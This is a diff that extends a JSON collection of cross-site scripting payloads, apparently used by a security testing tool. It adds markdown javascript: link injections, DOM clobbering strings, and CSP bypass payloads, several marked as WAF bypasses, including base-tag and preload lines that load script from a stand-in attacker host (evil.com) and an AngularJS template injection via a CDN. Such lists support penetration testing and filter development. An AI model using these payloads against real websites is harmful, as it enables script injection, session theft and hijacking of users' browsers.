@@ -103,6 +103,35 @@
         {"payload": "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>", "description": "MathML xlink href data URI", "waf_bypass": true},
         {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//", "description": "Polyglot multi-context bypass", "waf_bypass": true}
       ]
+    },
+    "markdown": {
+      "description": "XSS via markdown rendering engines that allow dangerous HTML or URI schemes",
+      "payloads": [
+        {"payload": "[click](javascript:alert(1))", "description": "Markdown link with javascript: URI", "waf_bypass": false},
+        {"payload": "![img](x \"onerror=alert(1)\")", "description": "Image alt/title attribute injection via markdown", "waf_bypass": false},
+        {"payload": "`<img src=x onerror=alert(1)>`", "description": "Inline code block with HTML tag that some renderers fail to sanitize", "waf_bypass": false},
+        {"payload": "[link](javascript:alert(1)//)", "description": "Markdown link with javascript: URI and comment", "waf_bypass": false},
+        {"payload": "[a](<javascript:alert(1)>)", "description": "Markdown link with angle bracket wrapped javascript: URI", "waf_bypass": false}
+      ]
+    },
+    "dom_clobbering": {
+      "description": "XSS via DOM property clobbering to override JavaScript object properties with HTML elements",
+      "payloads": [
+        {"payload": "<a id=config href=\"javascript:alert(1)\"></a>", "description": "Clobber config object with anchor href", "waf_bypass": false},
+        {"payload": "<form id=config><input name=url value=https://evil.com></form>", "description": "Clobber config.url via form input name", "waf_bypass": false},
+        {"payload": "<a id=config></a><a id=config name=raw href=javascript:alert(1)></a>", "description": "DOM collection clobbering with duplicate IDs", "waf_bypass": false},
+        {"payload": "<base href=\"https://evil.com/\">", "description": "Base tag override for relative URL hijacking", "waf_bypass": false},
+        {"payload": "<img name=body>", "description": "Clobber document.body with named img element", "waf_bypass": false}
+      ]
+    },
+    "csp_bypass": {
+      "description": "CSP bypass techniques using trusted CDN scripts, base tag injection, and nonce theft",
+      "payloads": [
+        {"payload": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js\"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>", "description": "CSP bypass via trusted CDN AngularJS CSTI", "waf_bypass": true},
+        {"payload": "<base href=\"https://evil.com/\">", "description": "Base tag injection to redirect relative script loads", "waf_bypass": true},
+        {"payload": "<link rel=preload as=script href=//evil.com/xss.js>", "description": "Preload link to bypass script-src via resource hints", "waf_bypass": true},
+        {"payload": "<script nonce=STOLEN_NONCE>alert(1)</script>", "description": "Script tag with stolen or predicted CSP nonce", "waf_bypass": true}
+      ]
     }
   }
 }
